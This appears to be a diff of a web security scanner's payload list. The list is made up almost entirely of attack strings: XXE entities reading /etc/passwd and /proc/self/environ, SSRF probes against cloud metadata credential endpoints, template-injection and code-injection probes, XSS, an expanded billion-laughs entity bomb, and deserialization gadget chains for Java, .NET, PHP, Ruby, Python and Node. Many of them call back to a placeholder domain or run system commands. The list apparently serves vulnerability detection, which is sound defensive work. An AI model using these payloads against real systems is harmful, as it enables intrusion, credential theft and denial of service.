@@ -62,7 +62,6 @@ new java.net.URL('http://{domain}/javaeval').openStream()
 <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{domain}/xxe">]><foo>&xxe;</foo>
 <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % dtd SYSTEM "http://{domain}/evil.dtd">%dtd;%payload;]><foo>&exfil;</foo>
 <xi:include xmlns:xi="http://www.w3.org/2001/XInclude" parse="text" href="file:///etc/passwd"/>
-<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY a "1337">]><foo>&a;</foo>
 http://169.254.169.254/latest/meta-data/iam/security-credentials/
 http://metadata.google.internal/computeMetadata/v1/
 http://169.254.169.254/metadata/instance?api-version=2021-02-01
@@ -518,11 +517,6 @@ ${"java.net.URL"?new("http://{domain}/ssti").openStream()}
 {php}sleep(5);{/php}
 {fetch file="http://{domain}/smarty"}
 {fetch file="http://{domain}/smarty" assign="x"}
-{!!7*191!!}
-{{$undefined->method()}}
-@php sleep(5); @endphp
-@php file_get_contents('http://{domain}/blade') @endphp
-@php fopen('http://{domain}/blade','r') @endphp
 <%=invalid%>
 <%=raise 'ssti_error'%>
 <%=sleep(5)%>
@@ -537,7 +531,7 @@ ${"java.net.URL"?new("http://{domain}/ssti").openStream()}
 =require 'net/http';Net::HTTP.get(URI('http://{domain}/haml'))
 {{invalid | no_such_filter}}
 [[${7*191}]]
-[[${T(java.lang.Math).abs(-1337)}]]
+[[${T(java.lang.Math).multiplyExact(7,191)}]]
 *{7*191}
 [[${T(invalid).method()}]]
 [[${T(java.lang.Runtime).exec('invalid')}]]
@@ -554,8 +548,8 @@ ${"java.net.URL"?new("http://{domain}/ssti").openStream()}
 @{System.Threading.Thread.Sleep(5000);}
 @{new System.Net.WebClient().DownloadString("http://{domain}/razor");}
 @{new System.Net.Http.HttpClient().GetStringAsync("http://{domain}/razor").Result;}
-{{printf "%d" 1337}}
-{{html 1337}}
+{{multiply 7 191}}
+{{add 1336 1}}
 {{.Invalid}}
 {{template "nonexistent"}}
 ;invalidcmd
@@ -746,8 +740,7 @@ local s=os.clock();while os.clock()-s<5 do end
 require('socket').sleep(5)
 require("socket").connect("{domain}", 80)
 require("socket.http").request("http://{domain}/lua")
-assert(system('echo 1337'))
-preg_replace('/.*/e','system("echo 1337")','')
+system('expr 7 \\* 191')
 create_function('','return 7*191;')()
 assert(sleep(5)||1)
 assert(file_get_contents('http://{domain}/php'))
@@ -761,7 +754,7 @@ new GroovyShell().evaluate('7*191')
 Thread.sleep(5000)
 new GroovyShell().evaluate('Thread.sleep(5000)')
 new URL('http://{domain}/groovy').text
-['curl','http://{domain}/groovy'].execute()
+new java.net.URL('http://{domain}/groovy2').openStream()
 "http://{domain}/groovy".toURL().text
 throw new Exception('1337')
 1/0
@@ -811,14 +804,12 @@ ${alert(1337)}
 <noscript><p title="</noscript><img src=x onerror=alert(1337)>">
 <a href="data:text/html,<script>alert(1337)</script>">click</a>
 <svg><script>alert(1337)</script></svg>
-<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe "1337">]><root>&xxe;</root>
-<foo>1337</foo>
-<![CDATA[1337]]>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM>]><root/>
 <!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///proc/self/environ">]><foo>&xxe;</foo>
 <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{domain}/xxe.dtd">%xxe;]><root>1337</root>
 <hjk xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://{domain}/xxe" parse="text"/></hjk>
-<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "1337"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">]><root>&lol3;</root>
-<!DOCTYPE foo [<!ENTITY a "&#x26;b;"><!ENTITY b "1337">]><foo>&a;</foo>
+<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "ABCDEFGHIJ"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"><!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;"><!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;"><!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">]><root>&lol6;</root>
+<!DOCTYPE foo [<!ENTITY a "&#x26;b;"><!ENTITY b "&#x26;a;">]><foo>&a;</foo>
 http://[invalid
 http://
 http:///
@@ -1210,29 +1201,29 @@ admin'//
 {"selector":{"name":{"$exists":true}},"invalid_field":1}
 {"selector":{"name":{"$elemMatch":{"$invalid":1}}}}
 Y19fYnVpbHRpbl9fCmV2YWwKKFMnNyoxOTEnCnRSLg==
-Y29zCnN5c3RlbQooUydzbGVlcCA1Jwp0Ui4=
+Y3RpbWUKc2xlZXAKKEk1CnRSLg==
 Y19fYnVpbHRpbl9fCmV2YWwKKFMnX19pbXBvcnRfXygidXJsbGliLnJlcXVlc3QiKS5yZXF1ZXN0LnVybG9wZW4oImh0dHA6Ly97ZG9tYWlufS9waWNrbGUiKScKdFIu
 Y19fYnVpbHRpbl9fCmV2YWwKKFMnX19pbXBvcnRfXygic29ja2V0IikuZ2V0YWRkcmluZm8oIntkb21haW59Iiw4MCknCnRSLg==
 Y19fYnVpbHRpbl9fCmV2YWwKKFMnMS8wJwp0Ui4=
 Y19fYnVpbHRpbl9fCl9faW1wb3J0X18KKFMnaW52YWxpZF9tb2R1bGVfMTMzNycKdFIu
-Y3N1YnByb2Nlc3MKY2hlY2tfb3V0cHV0CihTJ2VjaG8gMTMzNycKSTAxCnRSLg==
+Y19fYnVpbHRpbl9fCmV2YWwKKFMnc3RyKDcqMTkxKScKdFIu
 gAJjX19idWlsdGluX18KZXZhbApxAFgFAAAANyoxOTFxAYVxAlJxAy4=
-gAJjcG9zaXgKc3lzdGVtCnEAWAcAAABzbGVlcCA1cQGFcQJScQMu
+gAJjdGltZQpzbGVlcApxAEsFhXEBUnECLg==
 gAJjX19idWlsdGluX18KZXZhbApxAFhHAAAAX19pbXBvcnRfXygidXJsbGliLnJlcXVlc3QiKS5yZXF1ZXN0LnVybG9wZW4oImh0dHA6Ly97ZG9tYWlufS9waWNrbGUyIilxAYVxAlJxAy4=
 gAJjX19idWlsdGluX18KZXZhbApxAFgDAAAAMS8wcQGFcQJScQMu
 gASVIQAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwFNyoxOTGUhZRSlC4=
-gASVIgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAdzbGVlcCA1lIWUUpQu
+gASVGAAAAAAAAACMBHRpbWWUjAVzbGVlcJSTlEsFhZRSlC4=
 gASVYwAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIxHX19pbXBvcnRfXygidXJsbGliLnJlcXVlc3QiKS5yZXF1ZXN0LnVybG9wZW4oImh0dHA6Ly97ZG9tYWlufS9waWNrbGU0IimUhZRSlC4=
 !!python/object/apply:builtins.eval ["7*191"]
-!!python/object/apply:subprocess.check_output [["echo","1337"]]
-!!python/object/apply:os.system ["sleep 5"]
+!!python/object/apply:builtins.eval ["str(7*191)"]
+!!python/object/apply:time.sleep [5]
 !!python/object/apply:builtins.exec ["import urllib.request;urllib.request.urlopen('http://{domain}/yaml')"]
 !!python/object/apply:builtins.eval ["__import__('socket').getaddrinfo('{domain}',80)"]
 !!python/object/apply:builtins.__import__ ['invalid_module_1337']
 !!python/object/apply:builtins.eval ["1/0"]
 !!python/object/apply:builtins.exec ["import urllib.request;urllib.request.urlopen('http://{domain}/yaml2')"]
 {"py/reduce":[{"py/function":"builtins.eval"},{"py/tuple":["7*191"]}]}
-{"py/reduce":[{"py/function":"subprocess.check_output"},{"py/tuple":[["echo","1337"]]}]}
+{"py/reduce":[{"py/function":"builtins.eval"},{"py/tuple":["str(7*191)"]}]}
 {"py/reduce":[{"py/function":"time.sleep"},{"py/tuple":[5]}]}
 {"py/reduce":[{"py/function":"builtins.eval"},{"py/tuple":["1/0"]}]}
 {"py/reduce":[{"py/function":"builtins.eval"},{"py/tuple":["__import__('urllib.request').request.urlopen('http://{domain}/jsonpickle')"]}]}
@@ -1245,13 +1236,13 @@ a:1:{i:0;O:23:"UndefinedClassName1337":0:{}}
 O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{s:9:"\0*\0events";O:28:"Illuminate\Events\Dispatcher":1:{s:12:"\0*\0listeners";a:1:{s:8:"shutdown";a:1:{i:0;s:6:"system";}}}s:8:"\0*\0event";s:21:"nslookup {domain}";}
 O:44:"Symfony\Component\Cache\Adapter\ProxyAdapter":2:{s:54:"\0Symfony\Component\Cache\Adapter\ProxyAdapter\0pool";O:44:"Symfony\Component\Cache\Adapter\ArrayAdapter":3:{s:54:"\0Symfony\Component\Cache\Adapter\ArrayAdapter\0values";a:0:{}s:60:"\0Symfony\Component\Cache\Adapter\ArrayAdapter\0expiration";a:0:{}s:21:"\0*\0createCacheItem";a:2:{i:0;O:15:"Faker\Generator":1:{s:13:"\0*\0formatters";a:1:{s:11:"fetchObject";s:6:"system";}}i:1;s:11:"fetchObject";}}s:58:"\0Symfony\Component\Cache\Adapter\ProxyAdapter\0setInner";s:9:"echo 1337";}
 {"rce":"_$$ND_FUNC$$_function(){return 7*191}()"}
-{"rce":"_$$ND_FUNC$$_function(){require('child_process').execSync('sleep 5')}()"}
+{"rce":"_$$ND_FUNC$$_function(){var d=Date.now()+5000;while(Date.now()<d){}}()"}
 {"rce":"_$$ND_FUNC$$_function(){require('http').get('http://{domain}/nodeser')}()"}
 {"rce":"_$$ND_FUNC$$_function(){return eval('7*191')}()"}
 {"rce":"_$$ND_FUNC$$_function(){throw new Error('1337')}()"}
 !!invalid_tag_probe 1337
 !!js/regexp /[invalid/
-{"__js":"throw new Error(1337)"}
+{"fn":{"__js_function":"function(){return 7*191}"}}
 {"__proto__":{"__cryo__":{"reduce":"_$$ND_FUNC$$_function(){throw new Error(1337)}()"}}}
 --- !ruby/object:NonExistentClass1337\ni: x
 --- !ruby/object:Gem::Requirement\nrequirements:\n  !ruby/object:Gem::Package::TarReader\n  io: &1 !ruby/object:Net::BufferedIO\n    io: &1 !ruby/object:Gem::Package::TarReader::Entry\n       read: 0\n       header: "abc"\n    debug_output: &1 !ruby/object:Net::WriteAdapter\n       socket: &1 !ruby/object:Gem::RequestSet\n           sets: !ruby/object:Net::WriteAdapter\n               socket: !ruby/module 'Kernel'\n               method_id: :system\n           git_set: nslookup {domain}\n       method_id: :resolve
@@ -1295,7 +1286,7 @@ ${jndi:ldap://{domain}/${sys:user.dir}}
 !!com.sun.rowset.JdbcRowSetImpl {dataSourceName: "ldap://{domain}/a", autoCommit: true}
 !!com.nonexistent.FakeClass1337 {}
 !!com.mchange.v2.c3p0.WrapperConnectionPoolDataSource {userOverridesAsString: "HexAsciiSerializedMap:aced...;", jndiName: "ldap://{domain}/a"}
-<java version="1.8.0" class="java.beans.XMLDecoder"><object class="java.lang.ProcessBuilder"><array class="java.lang.String" length="3"><void index="0"><string>/bin/sh</string></void><void index="1"><string>-c</string></void><void index="2"><string>echo 1337</string></void></array><void method="start"/></object></java>
+<java version="1.8.0" class="java.beans.XMLDecoder"><object class="java.lang.ProcessBuilder"><array class="java.lang.String" length="3"><void index="0"><string>/bin/sh</string></void><void index="1"><string>-c</string></void><void index="2"><string>expr 7 \* 191</string></void></array><void method="start"/></object></java>
 <java version="1.8.0" class="java.beans.XMLDecoder"><object class="java.lang.Thread" method="sleep"><long>5000</long></object></java>
 <java version="1.8.0" class="java.beans.XMLDecoder"><object class="java.net.URL"><string>http://{domain}/xmldecoder</string><void method="openStream"/></object></java>
 <java version="1.8.0" class="java.beans.XMLDecoder"><object class="com.nonexistent.Fake1337"/></java>
@@ -1304,7 +1295,7 @@ rO0ABXVyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAJ0AAxuc2xvb2t1cCB0ZXN0
 rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHA/QAAAAAAADHcIAAAAEAAAAAFzcgAMamF2YS5uZXQuVVJMliU3Nhr85HIDAAdJAAhoYXNoQ29kZUkABHBvcnRMAAlhdXRob3JpdHl0ABJMamF2YS9sYW5nL1N0cmluZztMAARmaWxldAASTGphdmEvbGFuZy9TdHJpbmc7TAAEaG9zdHQAEkxqYXZhL2xhbmcvU3RyaW5nO0wACHByb3RvY29sdAASTGphdmEvbGFuZy9TdHJpbmc7TAADcmVmdAASTGphdmEvbGFuZy9TdHJpbmc7cP//////////dAAIe2RvbWFpbn10AAcvdXJsZG5zdAAIe2RvbWFpbn10AARodHRwcHh0ABZodHRwOi8ve2RvbWFpbn0vdXJsZG5zeA==
 C_hessianRldap://{domain}/a
 {"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","ObjectInstance":{"$type":"System.Diagnostics.Process, System","StartInfo":{"$type":"System.Diagnostics.ProcessStartInfo, System","FileName":"nslookup","Arguments":"{domain}"}}}
-{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","ObjectInstance":{"$type":"System.Diagnostics.Process, System","StartInfo":{"$type":"System.Diagnostics.ProcessStartInfo, System","FileName":"cmd","Arguments":"/c echo 1337"}}}
+{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","ObjectInstance":{"$type":"System.Diagnostics.Process, System","StartInfo":{"$type":"System.Diagnostics.ProcessStartInfo, System","FileName":"cmd","Arguments":"/c set /a 7*191"}}}
 {"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","ObjectInstance":{"$type":"System.Diagnostics.Process, System","StartInfo":{"$type":"System.Diagnostics.ProcessStartInfo, System","FileName":"cmd","Arguments":"/c timeout 5"}}}
 {"$type":"System.Configuration.Install.AssemblyInstaller, System.Configuration.Install","Path":"\\\\{domain}\\share\\evil.dll"}
 <root type="System.Windows.Data.ObjectDataProvider, PresentationFramework"><ObjectInstance type="System.Diagnostics.Process, System"><StartInfo><FileName>nslookup</FileName><Arguments>{domain}</Arguments></StartInfo></ObjectInstance><MethodName>Start</MethodName></root>
@@ -1313,7 +1304,7 @@ AAEAAAD/////AQAAAAAAAAAEAQAAAD1TeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Tb3J0ZWRTZXRg
 <SOAP-ENV:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:clr="http://schemas.microsoft.com/soap/encoding/clr/1.0" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><SOAP-ENV:Body><a1:ObjectDataProvider xmlns:a1="http://schemas.microsoft.com/clr/nsassem/System.Windows.Data/PresentationFramework"><MethodName>Start</MethodName><ObjectInstance xsi:type="a2:Process" xmlns:a2="http://schemas.microsoft.com/clr/nsassem/System.Diagnostics/System"><StartInfo><FileName>nslookup</FileName><Arguments>{domain}</Arguments></StartInfo></ObjectInstance></a1:ObjectDataProvider></SOAP-ENV:Body></SOAP-ENV:Envelope>
 __VIEWSTATE=/wEPDwUKLTEyMzQ1Njc4OQ==
 __VIEWSTATEGENERATOR=CA0B0334
-{"__type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","ObjectInstance":{"__type":"System.Diagnostics.Process, System","StartInfo":{"__type":"System.Diagnostics.ProcessStartInfo, System","FileName":"cmd","Arguments":"/c echo 1337"}}}
+{"__type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","ObjectInstance":{"__type":"System.Diagnostics.Process, System","StartInfo":{"__type":"System.Diagnostics.ProcessStartInfo, System","FileName":"cmd","Arguments":"/c set /a 7*191"}}}
 /wEAAQAAAP////8BAAAAAAAAAA==
 AAEAAAD/////AQAAAAAAAAAMAQAAABVTeXN0ZW0uV2luZG93cy5Gb3Jtcw==
 cHN0MAUKBAAAAAAAAAAA
